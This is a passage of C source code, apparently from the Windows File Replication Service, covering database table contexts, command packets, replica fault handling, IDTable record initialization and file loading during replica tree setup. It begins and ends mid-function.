/*++

Routine Description:

    This function allocates and initializes a table context structure,
    allocating the initial storage for the data record.

Arguments:

    TableType     -- The table type code to open.

Return Value:

    TableCtx      -- ptr to the table context.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCreateTableContext:"

    NTSTATUS     Status;
    PTABLE_CTX   TableCtx;

    //
    // Allocate a new table context using the table type of the caller.
    //

    TableCtx = FrsAlloc(sizeof(TABLE_CTX));
    TableCtx->TableType = TABLE_TYPE_INVALID;
    Status = DbsAllocTableCtx(TableType, TableCtx);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer addresses
    // to read and write the fields of the ConfigTable records into ConfigRecord.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    Status = DbsAllocRecordStorage(TableCtx);

    if (!NT_SUCCESS(Status)) {
        DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
        DbsFreeTableCtx(TableCtx, 1);
        TableCtx = FrsFree(TableCtx);
    }

    return TableCtx;
}


BOOL
DbsFreeTableContext(
    IN PTABLE_CTX TableCtx,
    IN JET_SESID  Sesid
)
/*++

Routine Description:

    This function frees a tablectx struct.  If the table is still open and the
    Session ID doesn't match the ID of the thread that opened the table
    the function fails otherwise it closes the table and frees the storage.

Arguments:

    TableCtx  -- ptr to the table context.
    Sesid     -- If the table is still open this is jet session ID that was used.

Return Value:

    TRUE if table context was released.
    FALSE if table still open and session ID mismatch.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsFreeTableContext:"

    JET_ERR jerr;

    if ((TableCtx == NULL) ||
        (Sesid == JET_sesidNil)) {
        DPRINT2(0, "ERROR - DbsFreeTableContext called with bad param.  TableCtx: %08x, Sesid %08x\n",
                TableCtx, Sesid);
        return FALSE;
    }
    //
    // Close the tables and reset TableCtx Tid and Sesid.   Macro writes 1st arg.
    //
    if (IS_TABLE_OPEN(TableCtx)) {
        DbsCloseTable(jerr, Sesid, TableCtx);
        if (jerr == JET_errInvalidSesid) {
            return FALSE;
        }
    }

    DbsFreeTableCtx(TableCtx, 1);

    FrsFree(TableCtx);

    return TRUE;
}



PCOMMAND_PACKET
DbsPrepareCmdPkt (
    PCOMMAND_PACKET CmdPkt,
    PREPLICA        Replica,
    ULONG           CmdRequest,
    PTABLE_CTX      TableCtx,
    PVOID           CallContext,
    ULONG           TableType,
    ULONG           AccessRequest,
    ULONG           IndexType,
    PVOID           KeyValue,
    ULONG           KeyValueLength,
    BOOL            Submit
    )
/*++

Routine Description:

    Post a database service request for the given replica set.

    WARNING -
    The caller passes pointers to the replica struct, the call context and
    the KeyValue.  Until this request is completed the data in these structures
    can't be changed and the memory can't be released.

    The one exception is the KeyValue.  If we allocate the command packet here
    then the key value is appended to the end of the command packet.

Arguments:

    CmdPkt          -- If NULL then alloc is done here.
    Replica         -- ptr to Replica struct.
    CmdRequest      -- read, write, update
    TableCtx        -- Table context handle (NULL on first call)
    CallContext     -- optional call specific data
    TableType       -- Type code for the table to access
    AccessRequest   -- (ByKey, First, Last, Next) | Close
    IndexType       -- The table index to use
    KeyValue        -- The record key value for lookup
    KeyValueLength  -- The Length of the key value
    Submit          -- If true then submit to command to the server.

Return Value:

    ptr to the command packet.

--*/
{

#undef DEBSUB
#define DEBSUB "DbsPrepareCmdPkt:"

    PVOID KeyData;

    //
    // Allocate a command packet unless the caller provided one.
    // Put the key value at the end of the packet so the caller's
    // storage can go away.
    //

    if (CmdPkt == NULL) {
            CmdPkt = FrsAllocCommandEx(&DBServiceCmdServer.Queue,
                                      (USHORT)CmdRequest,
                                       KeyValueLength+8);
            //
            // Put the key value at the end of the packet.  Quadword align it.
            //
            KeyData = (PCHAR)CmdPkt + sizeof(COMMAND_PACKET);
            KeyData = (PVOID) QuadAlign(KeyData);

            CopyMemory(KeyData, KeyValue, KeyValueLength);
            KeyValue = KeyData;
    } else {
        //
        // pickup new command and make sure cmd pkt goes to right server.
        //
        CmdPkt->TargetQueue = &DBServiceCmdServer.Queue;
        CmdPkt->Command = (USHORT)CmdRequest;
    }

    //
    // Capture the parameters.
    //
    CmdPkt->Parameters.DbsRequest.Replica        = Replica;
    CmdPkt->Parameters.DbsRequest.TableCtx       = TableCtx;
    CmdPkt->Parameters.DbsRequest.CallContext    = CallContext;
    CmdPkt->Parameters.DbsRequest.TableType      = TableType;
    CmdPkt->Parameters.DbsRequest.AccessRequest  = AccessRequest;
    CmdPkt->Parameters.DbsRequest.IndexType      = IndexType;
    CmdPkt->Parameters.DbsRequest.KeyValue       = KeyValue;
    CmdPkt->Parameters.DbsRequest.KeyValueLength = KeyValueLength;
    CmdPkt->Parameters.DbsRequest.FStatus        = 0;
    CmdPkt->Parameters.DbsRequest.FieldCount     = 0;

    //
    // Queue the request.
    //

    if (Submit) {
        FrsSubmitCommandServer(&DBServiceCmdServer, CmdPkt);
        DPRINT3(4,"DBServiceRequest posted for Replica %ws,  Req: %d, Ctx: %08x\n",
               ((Replica) ? Replica->ReplicaName->Name : L"Null"), CmdRequest, CallContext);
    } else {
        DPRINT3(4,"DBServiceRequest prepared for Replica %ws,  Req: %d, Ctx: %08x\n",
               ((Replica) ? Replica->ReplicaName->Name : L"Null"), CmdRequest, CallContext);
    }

    return CmdPkt;

}




PCOMMAND_PACKET
DbsPrepFieldUpdateCmdPkt (
    PCOMMAND_PACKET CmdPkt,
    PREPLICA        Replica,
    PTABLE_CTX      TableCtx,
    PVOID           CallContext,
    ULONG           TableType,
    ULONG           IndexType,
    PVOID           KeyValue,
    ULONG           KeyValueLength,
    ULONG           FieldCount,
    PULONG          FieldIDList
    )
/*++

Routine Description:

    Prepare a database service command packet to update selected fields in
    a gvien record of a given table for a given replica set.  The command used
    is CMD_UPDATE_RECORD_FIELDS.

    WARNING -
    The caller passes pointers to the replica struct, the call context,
    the KeyValue and the FieldIDList.
    Until this request is completed the data in these structures
    can't be changed and the memory can't be released.

    The one exception is the KeyValue.  If we allocate the command packet here
    then the key value is appended to the end of the command packet.

Arguments:

    CmdPkt          -- If NULL then alloc is done here.
    Replica         -- ptr to Replica struct.
    TableCtx        -- Table context handle (NULL on first call)
    CallContext     -- optional call specific data
    TableType       -- Type code for the table to access
    IndexType       -- The table index to use
    KeyValue        -- The record key value for lookup
    KeyValueLength  -- The Length of the key value
    FieldCount      -- The number of record fields to update
    FieldIDList     -- Array of Field ID numbers.

Return Value:

    ptr to the command packet.

--*/
{

#undef DEBSUB
#define DEBSUB "DbsPrepFieldUpdateCmdPkt:"

    if (FieldCount == 0) {
        return NULL;
    }

    CmdPkt = DbsPrepareCmdPkt (CmdPkt,                       //  CmdPkt,
                               Replica,                      //  Replica,
                               CMD_UPDATE_RECORD_FIELDS,     //  CmdRequest,
                               TableCtx,                     //  TableCtx,
                               CallContext,                  //  CallContext,
                               TableType,                    //  TableType,
                               DBS_ACCESS_BYKEY |
                                 DBS_ACCESS_CLOSE,           //  AccessRequest,
                               IndexType,                    //  IndexType,
                               KeyValue,                     //  KeyValue,
                               KeyValueLength,               //  KeyValueLength,
                               FALSE);                       //  Submit

    FRS_ASSERT(CmdPkt != NULL);


    CmdPkt->Parameters.DbsRequest.SimpleFieldIDS = FieldIDList;
    CmdPkt->Parameters.DbsRequest.FieldCount     = FieldCount;


    return CmdPkt;

}




ULONG
DbsProcessReplicaFaultList(
    PDWORD  pReplicaSetsDeleted
    )
{
#undef DEBSUB
#define DEBSUB "DbsProcessReplicaFaultList:"

    ULONG    FStatus              = FrsErrorSuccess;
    BOOL     FoundReplicaToDelete = FALSE;
    PREPLICA ReplicaToDelete      = NULL;
    DWORD    ReplicaSetsDeleted   = 0;
    WCHAR    DsPollingIntervalStr[7]; // Max interval is NTFRSAPI_MAX_INTERVAL.
    PWCHAR   FStatusUStr          = NULL;
    extern   ULONG  DsPollingInterval;

    do {
        FoundReplicaToDelete = FALSE;
        //
        // Scan the FAULT list.
        //
        ForEachListEntry( &ReplicaFaultListHead, REPLICA, ReplicaList,
            //
            // The Loop iterator pE is of type PREPLICA.
            //
            DPRINT4(4, ":S: Replica (%d) %ws is in the Fault List with FStatus %s and State %d\n",
                pE->ReplicaNumber,
                (pE->ReplicaName != NULL) ? pE->ReplicaName->Name : L"<null>",
                 ErrLabelFrs(pE->FStatus),pE->ServiceState);
            if (REPLICA_STATE_NEEDS_RESTORE(pE->ServiceState)) {
                //
                // If a replica is in this state then close it and delete it. At the
                // next poll the replica will be recreated.
                //
                FoundReplicaToDelete = TRUE;
                ReplicaToDelete = pE;
                break;
            }
        );
        if (FoundReplicaToDelete && (ReplicaToDelete != NULL)) {
            //
            // Delete the replica from DB.
            //
            DPRINT1(4,":S: WARN - Stopping and deleting replica (%ws) from DB\n",ReplicaToDelete->ReplicaName->Name);
            //
            // Get the DsPollingInteval in minutes.
            //
            _itow(DsPollingInterval / (60 * 1000), DsPollingIntervalStr, 10);

            FStatusUStr = FrsAtoW(ErrLabelFrs(ReplicaToDelete->FStatus));

            EPRINT3(EVENT_FRS_ERROR_REPLICA_SET_DELETED, ReplicaToDelete->SetName->Name, FStatusUStr,
                    DsPollingIntervalStr);

            FrsFree(FStatusUStr);
            //
            // If this is the sysvol replica set then unshare the sysvols by setting sysvolready to 0.
            // Sysvolready will be reset when this DC completes the first vvjoin after it is recreated,
            //
            if (FRS_RSTYPE_IS_SYSVOL(ReplicaToDelete->ReplicaSetType)) {
                RcsSetSysvolReady(0);
            }
            //
            // CMD_DELETE_NOW will close replica set, delete cxtions and
            // delete the database tables by calling RcsCloseReplicaSetmember(),
            // RcsCloseReplicaCxtions() and RcsDeleteReplicaFromDb(). It will also
            // remove the replica set from the ReplicasByGuid and ReplicasByNumber
            // tables.
            // This command is not synchronous. The delete might complete at a later
            // time.
            //
            RcsSubmitReplicaSync(ReplicaToDelete, NULL, NULL, CMD_DELETE_NOW);

            FrsRtlRemoveEntryQueue(&ReplicaFaultListHead, &ReplicaToDelete->ReplicaList);

            ++ReplicaSetsDeleted;

        }
    } while ( FoundReplicaToDelete );

    //
    // For now all we do is print out the error status above for each
    // replica set that failed to init.  If we return an error then our
    // caller will treat this as the DBservice failing to start which will
    // hose any replica sets that opened successfully.
    //
    // Until we have better recovery / reporting code we return Success status.
    //
    if (pReplicaSetsDeleted != NULL) {
        *pReplicaSetsDeleted = ReplicaSetsDeleted;
    }

    return FrsErrorSuccess;


#if 0
    //  may still need to Add more details to why replica set failed to init.

    // CHECK FOR
    // No system volume init record means invalid database because
    // the system volume replica tables are the templates for creating
    // the tables for all the other replicas.
    //

    //
    // The Open failed.  Classify error and recover if possible.
    //

    if ((FStatus == FrsErrorDatabaseCorrupted) ||
        (FStatus == FrsErrorInternalError)) {

        //
        // Sys Vol Replica is either not there or bad.
        // Delete it Create a new set of Replica Tables.
        //
        DPRINT(0,"ERROR - Deleting system volume replica tables.\n");
        //LogUnhandledError(err);

        jerr = DbsDeleteReplicaTables(ThreadCtx, ReplicaSysVol);
    }
    if (FStatus == FrsErrorNotFound) {
        //
        // Create the system volume replica tables in Jet.
        //
        DPRINT(0,"Creating system volume replica tables.\n");
        FStatus = DbsCreateReplicaTables(ThreadCtx, ReplicaSysVol);
        if (!FRS_SUCCESS(FStatus)) {
            DPRINT_FS(0, "ERROR - DbsCreateReplicaTables failed.", FStatus);
            //LogUnhandledError(err);
            return FStatus;
        }
    }

#endif
}


ULONG
DbsInitializeIDTableRecord(
    IN OUT PTABLE_CTX            TableCtx,
    IN     HANDLE                FileHandleArg,
    IN     PREPLICA              Replica,
    IN     PCHANGE_ORDER_ENTRY   ChangeOrder,
    IN     PWCHAR                FileName,
    IN OUT BOOL                  *ExistingOid
    )
/*++
Routine Description:

    Initialize a new IDTable record provided in the TableCtx param.
    The data is for a file specified by the open file handle.
    This routine is used by three types of callers:

    1. ReplicaTree Load - In this case ChangeOrder is NULL and the caller fills
       in some of the IDTable record fields.

    2. Local change orders - Changes that originate from the local machine.
       Here we get some info from the file itself.

    3. Remote change orders - Here the change comes in from a remote machine.
       We build an initial IDTable record and leave some fields for the caller
       to add later.

    No fields of the change order are set here.  The caller must do that.
    It also gets (and may set) the object ID from the file.

Arguments:

    TableCtx   -- The table context containing the ID Table record.
    FileHandleArg -- The open file handle.
    Replica    -- The target replica struct provides a link to the volume
                  monitor entry that provides the next VSN for replica tree
                  loads and the config record for the OriginatorGuid.
    ChangeOrder-- The change order for local or remote change orders.
    FileName   -- The filename for error messages.
    ExistingOid -- INPUT:  TRUE means use existing File OID if found.
                   RETURN:  TRUE means an existing File OID was used.

Return Value:

    WIN32 Status

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsInitializeIDTableRecord:"


    USN                           CurrentFileUsn;
    FILETIME                      SystemTime;
    FILE_NETWORK_OPEN_INFORMATION FileNetworkOpenInfo;

    PCONFIG_TABLE_RECORD ConfigRecord;
    PIDTABLE_RECORD      IDTableRec;

    NTSTATUS Status;
    ULONG    WStatus;
    HANDLE   FileHandle;

    BOOL RemoteCo = FALSE;
    BOOL MorphGenCo = FALSE;

    BOOL ReplicaTreeLoad;
    ULONG Len;


    ReplicaTreeLoad = (ChangeOrder == NULL);

    IDTableRec = (PIDTABLE_RECORD) (TableCtx->pDataRecord);
    ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);


    GetSystemTimeAsFileTime(&SystemTime);

    //
    //
    COPY_TIME(&IDTableRec->TombStoneGC, &SystemTime);

    //
    // Assume everything goes ok.  If any error occurs getting the data
    // to create the IDTable entry set ReplEnabled to FALSE.
    //
    IDTableRec->ReplEnabled = TRUE;

    ClearIdRecFlag(IDTableRec, IDREC_FLAGS_DELETED);
    ZeroMemory(&IDTableRec->Extension, sizeof(IDTABLE_RECORD_EXTENSION));


    //
    // Fields common to both local and remote change orders.
    //
    if (!ReplicaTreeLoad) {

        RemoteCo = !CO_FLAG_ON(ChangeOrder, CO_FLAG_LOCALCO);
        MorphGenCo = CO_FLAG_ON(ChangeOrder, CO_FLAG_MORPH_GEN);

        IDTableRec->ParentGuid     = ChangeOrder->Cmd.NewParentGuid;
        IDTableRec->ParentFileID   = ChangeOrder->NewParentFid;

        IDTableRec->VersionNumber  = ChangeOrder->Cmd.FileVersionNumber;
        IDTableRec->EventTime      = ChangeOrder->Cmd.EventTime.QuadPart;
        IDTableRec->OriginatorGuid = ChangeOrder->Cmd.OriginatorGuid;
        IDTableRec->OriginatorVSN  = ChangeOrder->Cmd.FrsVsn;

        Len = (ULONG) ChangeOrder->Cmd.FileNameLength;
        CopyMemory(IDTableRec->FileName, ChangeOrder->Cmd.FileName, Len);
        IDTableRec->FileName[Len/2] = UNICODE_NULL;
    }

    //
    // Field init for remote Change Orders or name Morph conflict gened COs.
    // For the latter the info is already in the CO just like remote COs.
    //
    if (RemoteCo || MorphGenCo) {

        IDTableRec->FileGuid = ChangeOrder->Cmd.FileGuid;

        //
        // We don't have a local file ID yet for the remote change order.
        // The Fid will be established after the remote CO is accepted and
        // we have created the target file container.  The caller will have to
        // initialize the following fields when the data is available.
        //
        // IDTableRec->FileID =
        // ChangeOrder->FileReferenceNumber =
        // IDTableRec->FileObjID =   (the full 64 byte object ID)
        //
        IDTableRec->FileCreateTime.QuadPart = (LONGLONG) 0;
        IDTableRec->FileWriteTime.QuadPart  = (LONGLONG) 0;
        IDTableRec->FileSize                = ChangeOrder->Cmd.FileSize;
        IDTableRec->CurrentFileUsn          = (USN) 0;

        IDTableRec->FileAttributes  = ChangeOrder->Cmd.FileAttributes;
        IDTableRec->FileIsDir = CoIsDirectory(ChangeOrder);

        //
        // That's it for remote COs.  The caller provides the rest.
        //
        return ERROR_SUCCESS;
    }

    //
    // Field init for data that comes from the local file.
    // This is for a local change order or a replica tree load.
    //
    if (ReplicaTreeLoad) {
        //
        // The caller provides the data for:
        //      ParentFileID, ParentGuid and Filename
        // in the IDTable record.
        //
        // Use the handle supplied and get the File ID, object ID,
        // file times and attributes.
        //
        WStatus = FrsReadFileDetails(FileHandleArg,
                                     FileName,
                                     &IDTableRec->FileObjID,
                                     &IDTableRec->FileID,
                                     &FileNetworkOpenInfo,
                                     ExistingOid);
        CLEANUP1_WS(0, "ERROR - FrsReadFileDetails(%ws), File Not Replicated.",
                    FileName, WStatus, RETURN_ERROR);

        //
        // Set the initial version number of the file to 0 and the event
        // time to the create time.
        //
        IDTableRec->VersionNumber = 0;
        COPY_TIME(&IDTableRec->EventTime, &SystemTime);
        //
        // Set the Originator GUID to us and the initial file USN to the
        // next FRS volume serial number.
        //
        NEW_VSN(Replica->pVme, &IDTableRec->OriginatorVSN);
        IDTableRec->OriginatorGuid = ConfigRecord->ReplicaVersionGuid;

        //
        // Keep the version vector up-to-date for VvJoin.
        //
        VVUpdate(Replica->VVector, IDTableRec->OriginatorVSN, &IDTableRec->OriginatorGuid);

        //
        // Capture the File's last write USN so we can use it for consistency
        // checking between the database and the file tree.
        //
        FrsReadFileUsnData(FileHandleArg, &IDTableRec->CurrentFileUsn);

        //
        // The following data fields are inited for ReplciaTree walks.
        //
        COPY_GUID(&IDTableRec->FileGuid, &IDTableRec->FileObjID);

        IDTableRec->FileCreateTime  = FileNetworkOpenInfo.CreationTime;
        IDTableRec->FileWriteTime   = FileNetworkOpenInfo.LastWriteTime;
        IDTableRec->FileSize        = FileNetworkOpenInfo.AllocationSize.QuadPart;
        IDTableRec->FileAttributes  = FileNetworkOpenInfo.FileAttributes;
        IDTableRec->FileIsDir       = (FileNetworkOpenInfo.FileAttributes &
                                       FILE_ATTRIBUTE_DIRECTORY) != 0;
    } else {
        //
        // This is a local change order.  Open the file by FID to get the
        // file times and attributes.
        //
        IDTableRec->FileID = ChangeOrder->FileReferenceNumber;
        IDTableRec->FileAttributes  = ChangeOrder->Cmd.FileAttributes;
        IDTableRec->FileIsDir       = CoIsDirectory(ChangeOrder);

        //
        // ASSIGN OBJECT ID
        //
        WStatus = ChgOrdHammerObjectId(ChangeOrder->Cmd.FileName,    //Name,
                                       (PULONG)&IDTableRec->FileID,  //Id,
                                       FILE_ID_LENGTH,               //IdLen,
                                       Replica->pVme,                //pVme,
                                       FALSE,                        //CallerSupplied
                                       &IDTableRec->CurrentFileUsn,  //*Usn,
                                       &IDTableRec->FileObjID,       //FileObjID,
                                       ExistingOid);                 //*ExistingOid


        if (!WIN_SUCCESS(WStatus)) {
            //
            // This object id will be hammered on the file prior to
            // generating the staging file.
            // Link tracking: if the OID was tunneled by NTFS.
            //
            ZeroMemory(&IDTableRec->FileObjID, sizeof(IDTableRec->FileObjID));
            FrsUuidCreate((GUID *)(&IDTableRec->FileObjID.ObjectId[0]));
        }
        COPY_GUID(&IDTableRec->FileGuid, &IDTableRec->FileObjID);

    if (WIN_NOT_FOUND(WStatus)) {
        //
        // The file has been deleted.
        //
        // The idtable record will never be inserted and we
        // will forget about this file (as we should).
        //
        CHANGE_ORDER_TRACE(3, ChangeOrder, "Deleted by user");
        return WStatus;
    }

        //
        // Read some optional debug info
        //
        WStatus = FrsOpenSourceFileById(&FileHandle,
                                        &FileNetworkOpenInfo,
                                        NULL,
                                        Replica->pVme->VolumeHandle,
                                        (PULONG)&ChangeOrder->FileReferenceNumber,
                                        FILE_ID_LENGTH,
//                                        READ_ACCESS,
//                                        STANDARD_RIGHTS_READ | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | ACCESS_SYSTEM_SECURITY | SYNCHRONIZE,
                                        READ_ATTRIB_ACCESS,
                                        ID_OPTIONS,
                                        SHARE_ALL,
                                        FILE_OPEN);

        if (WIN_NOT_FOUND(WStatus)) {
            //
            // The file has been deleted.
            //
            //
            // The idtable record will never be inserted and we
            // will forget about this file (as we should).
            //
            CHANGE_ORDER_TRACE(3, ChangeOrder, "Deleted by user");
            return WStatus;
        }

        if (!WIN_SUCCESS(WStatus)) {
            DPRINT_WS(0, "Some other error from OpenByFid", WStatus);
            //
            // Some other error occurred on the open.  We will assign
            // an object id that will be written to the file prior
            // to generating the staging file. This could break link tracking.
            // We don't want to lose track of this file.  The code that generates
            // the staging file will retry for us.
            //
            return ERROR_SUCCESS;
        }
        //
        // Get the last USN on the file and check it with the USN in the change
        // order.  If they are different then the file has changed again
        // and we can pitch this change order.
        //
        // Note: For this to work the we have to be sure that the change order
        //       to come replicates all the info this change order modifies too.
        //       e.g. if this was a create or an update and the later change order
        //       is a rename to move the file to a diff sub-dir then we have
        //       to propagate the file as well as the rename.  For the future.
        //
        // Get the File's current USN so we can check for consistency later
        // when the change order is about to be sent to an outbound partner.
        //
        FrsReadFileUsnData(FileHandle, &IDTableRec->CurrentFileUsn);
        FRS_CLOSE(FileHandle);

        //
        // Optional debug info
        //
        IDTableRec->FileCreateTime  = FileNetworkOpenInfo.CreationTime;
        IDTableRec->FileWriteTime   = FileNetworkOpenInfo.LastWriteTime;

        //
        // Use the most current info, if available, but don't disable
        // replication if we have only the info from the change order.
        //
        IDTableRec->FileSize        = FileNetworkOpenInfo.AllocationSize.QuadPart;
        IDTableRec->FileAttributes  = FileNetworkOpenInfo.FileAttributes;
        IDTableRec->FileIsDir       = (FileNetworkOpenInfo.FileAttributes &
                                       FILE_ATTRIBUTE_DIRECTORY) != 0;

        //
        // It is possible for the file attributes to have changed between the
        // time the USN record was processed and now.  Record the current
        // attributes in the change order.  This is especially true for dir
        // creates since while the dir was open other changes may have occurred.
        //
        if (ChangeOrder->Cmd.FileAttributes != FileNetworkOpenInfo.FileAttributes) {
            CHANGE_ORDER_TRACEX(3, ChangeOrder, "New File Attr= ", FileNetworkOpenInfo.FileAttributes);
            ChangeOrder->Cmd.FileAttributes = FileNetworkOpenInfo.FileAttributes;
        }
    }

    return ERROR_SUCCESS;

RETURN_ERROR:

    IDTableRec->ReplEnabled = FALSE;
    return WStatus;
}



typedef struct _LOAD_CONTEXT {
    ULONG               NumFiles;
    ULONG               NumDirs;
    ULONG               NumSkipped;
    ULONG               NumFiltered;
    LONGLONG            ParentFileID;
    GUID                ParentGuid;
    PREPLICA            Replica;
    PREPLICA_THREAD_CTX RtCtx;
    PTHREAD_CTX         ThreadCtx;
    HANDLE              SkippedFileHandle;
} LOAD_CONTEXT, *PLOAD_CONTEXT;

DWORD
DbsLoadReplicaFileTreeForceOpen(
    OUT HANDLE                      *OutFileHandle,
    IN  HANDLE                      DirectoryHandle,
    IN  PWCHAR                      DirectoryName,
    IN  DWORD                       DirectoryLevel,
    IN  PFILE_DIRECTORY_INFORMATION DirectoryRecord,
    IN  DWORD                       DirectoryFlags,
    IN  PWCHAR                      FileName,
    IN  PLOAD_CONTEXT               LoadContext
    )
{
/*++

Routine Description:

    FileName could not be opened with write access. Force
    open FileName, resetting attributes if needed.

Arguments:

    OutFileHandle       - Returned opened handle
    DirectoryHandle     - Handle for this directory.
    DirectoryName       - Relative name of directory
    DirectoryLevel      - Directory level (0 == root)
    DirectoryFlags      - See tablefcn.h, ENUMERATE_DIRECTORY_FLAGS_
    DirectoryRecord     - Record from DirectoryHandle
    FileName            - From DirectoryRecord (w/terminating NULL)
    LoadContext         - global info and state

Return Value:

    Nt Error Status.

--*/
#undef DEBSUB
#define DEBSUB  "DbsLoadReplicaFileTreeForceOpen:"

    NTSTATUS                NtStatus = 0;
    DWORD                   WStatus = ERROR_SUCCESS;
    HANDLE                  FileHandle = INVALID_HANDLE_VALUE;
    HANDLE                  AttrHandle = INVALID_HANDLE_VALUE;
    OBJECT_ATTRIBUTES       ObjectAttributes;
    FILE_BASIC_INFORMATION  BasicInformation;
    IO_STATUS_BLOCK         IoStatusBlock;
    UNICODE_STRING          ObjectName;

    //
    // Initialize output
    //
    *OutFileHandle = INVALID_HANDLE_VALUE;

    //
    // Object name used in later NT function calls
    //
    ObjectName.Length = (USHORT)DirectoryRecord->FileNameLength;
    ObjectName.MaximumLength = (USHORT)DirectoryRecord->FileNameLength;
    ObjectName.Buffer = DirectoryRecord->FileName;

    //
    // Relative open with write-attr access
    //
    ZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.ObjectName = &ObjectName;
    ObjectAttributes.RootDirectory = DirectoryHandle;
    NtStatus = NtCreateFile(&AttrHandle,
//                            ATTR_ACCESS,
                            READ_ATTRIB_ACCESS | WRITE_ATTRIB_ACCESS,
                            &ObjectAttributes,
                            &IoStatusBlock,
                            NULL,                  // AllocationSize
                            FILE_ATTRIBUTE_NORMAL,
                            (FILE_SHARE_READ |
                             FILE_SHARE_WRITE |
                             FILE_SHARE_DELETE),
                            FILE_OPEN,
                            OPEN_OPTIONS,
                            NULL,                  // EA buffer
                            0                      // EA buffer size
                            );
    CLEANUP_NT(0, "ERROR - NtCreateFile failed.", NtStatus, CLEANUP);

    //
    // Mark the handle so that we do not pick this journal record.
    //
    WStatus = FrsMarkHandle(LoadContext->Replica->pVme->VolumeHandle, AttrHandle);
    DPRINT1_WS(0, "++ WARN - FrsMarkHandle(%ws)", DirectoryRecord->FileName, WStatus);

    //
    // Set the attributes to allow write access
    //
    ZeroMemory(&BasicInformation, sizeof(BasicInformation));
    BasicInformation.FileAttributes =
        (DirectoryRecord->FileAttributes & ~NOREPL_ATTRIBUTES) | FILE_ATTRIBUTE_NORMAL;
    NtStatus = NtSetInformationFile(AttrHandle,
                                    &IoStatusBlock,
                                    &BasicInformation,
                                    sizeof(BasicInformation),
                                    FileBasicInformation);
    CLEANUP_NT(0, "ERROR - NtSetInformationFile failed.", NtStatus, CLEANUP);

    //
    // Relative open with RW access
    //
    ZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.ObjectName = &ObjectName;
    ObjectAttributes.RootDirectory = DirectoryHandle;


    NtStatus = NtCreateFile(&FileHandle,
//                                WRITE_ACCESS | READ_ACCESS,
                            READ_ATTRIB_ACCESS | WRITE_ATTRIB_ACCESS |
                            (BooleanFlagOn(DirectoryRecord->FileAttributes, FILE_ATTRIBUTE_DIRECTORY) ? FILE_LIST_DIRECTORY : 0),
                            &ObjectAttributes,
                            &IoStatusBlock,
                            NULL,                  // AllocationSize
                            FILE_ATTRIBUTE_NORMAL,
                            (FILE_SHARE_READ |
                             FILE_SHARE_WRITE |
                             FILE_SHARE_DELETE),
                            FILE_OPEN,
                            OPEN_OPTIONS,
                            NULL,                  // EA buffer
                            0                      // EA buffer size
                            );

    CLEANUP_NT(0, "ERROR - NtCreateFile failed.", NtStatus, CLEANUP);

    //
    // Reset the attributes back to their original values
    //
    ZeroMemory(&BasicInformation, sizeof(BasicInformation));
    BasicInformation.FileAttributes = DirectoryRecord->FileAttributes | FILE_ATTRIBUTE_NORMAL;
    NtStatus = NtSetInformationFile(AttrHandle,
                                    &IoStatusBlock,
                                    &BasicInformation,
                                    sizeof(BasicInformation),
                                    FileBasicInformation);
    if (!NT_SUCCESS(NtStatus)) {
        DPRINT1_NT(0, "WARN - IGNORE NtSetInformationFile(%ws);.", FileName, NtStatus);
        NtStatus = STATUS_SUCCESS;
    }

    //
    // SUCCESS
    //
    *OutFileHandle = FileHandle;
    FileHandle = INVALID_HANDLE_VALUE;

CLEANUP:
    FRS_CLOSE(FileHandle);
    FRS_CLOSE(AttrHandle);

    return NtStatus;
}


VOID
DbsAddtoListOfSkippedFiles(
    IN  PREPLICA                    Replica,
    IN  HANDLE                      DirectoryHandle,
    IN  PWCHAR                      DirectoryName,
    IN  PWCHAR                      FileName,
    IN  PLOAD_CONTEXT               LoadContext
    )
{
/*++

Routine Description:

    Open the file that holds the list of files/dir skipped during
    primary load and add this file to this list.

Arguments:

    Replica,
    DirectoryHandle,
    DirectoryName,
    FileName,
    LoadContext

Return Value:

    WIN32 Error Status.

--*/
#undef DEBSUB
#define DEBSUB  "DbsAddtoListOfSkippedFiles:"

    DWORD                   WStatus;
    PWCHAR                  Path = NULL;
    PWCHAR                  FullDirPath = NULL;
    PWCHAR                  FullFilePath = NULL;
    PWCHAR                  BufPath = NULL;
    BOOL                    BStatus;
    DWORD                   BytesWritten;
    WCHAR                   Bom = 0xFEFF; // byte-order mark


    //
    // If the Skipped file file is not open then open it.
    // Save the handle in the load context for future use.
    //
    if (!HANDLE_IS_VALID(LoadContext->SkippedFileHandle)) {
        //
        // Open ...\NTFRS_PREINSTALL_DIRECTORY\NTFRS_SKIPPED_FILES.
        // This file will hold the list of files skipped during primary loag.
        Path = FrsWcsPath(Replica->Root, NTFRS_PREINSTALL_DIRECTORY);
        FullFilePath = FrsWcsPath(Path, NTFRS_SKIPPED_FILES);

        WStatus = FrsCreateFileRelativeById(&LoadContext->SkippedFileHandle,
                                            Replica->PreInstallHandle,
                                            NULL,
                                            0,
                                            FILE_ATTRIBUTE_NORMAL,
                                            NTFRS_SKIPPED_FILES,
                                            (USHORT)(wcslen(NTFRS_SKIPPED_FILES) * sizeof(WCHAR)),
                                            NULL,
                                            FILE_OVERWRITE_IF,
                                            RESTORE_ACCESS);

        CLEANUP1_WS(0, "++ Error Opening/Creating skipped file %ws", FullFilePath, WStatus, CLEANUP);

        DPRINT1(4, "Successfully created skipped file %ws\n", FullFilePath);

        //
        // Always prefix a Unicode plain text file with a byte-order mark.
        // Because Unicode plain text is a sequence of 16-bit code values,
        // it is sensitive to the byte ordering used when the text was written.
        // A byte-order mark is not a control character that selects the byte order
        // of the text; it simply informs an application receiving the file that
        // the file is byte ordered.
        //
        // The first dword of a unicode text file is 0xFEFF.
        //
        BStatus = WriteFile(LoadContext->SkippedFileHandle,&Bom,
                  sizeof(WCHAR), &BytesWritten,NULL);

        if (BStatus != TRUE) {
